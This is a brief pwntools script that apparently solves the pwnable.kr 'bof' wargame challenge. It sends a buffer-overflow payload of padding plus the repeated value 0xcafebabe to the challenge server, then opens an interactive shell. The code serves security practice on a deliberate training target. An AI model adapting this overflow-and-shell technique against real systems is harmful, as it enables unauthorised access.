from pwn import *
context.terminal = ['gnome-terminal', '-e']
x = p32(0xcafebabe)
print(x)
p = remote('pwnable.kr', 9000)
#p = process(['./boffy'])
#gdb.attach(p)
z = b'A'*32 + x*32
print(z)
p.sendline(z)
p.interactive()
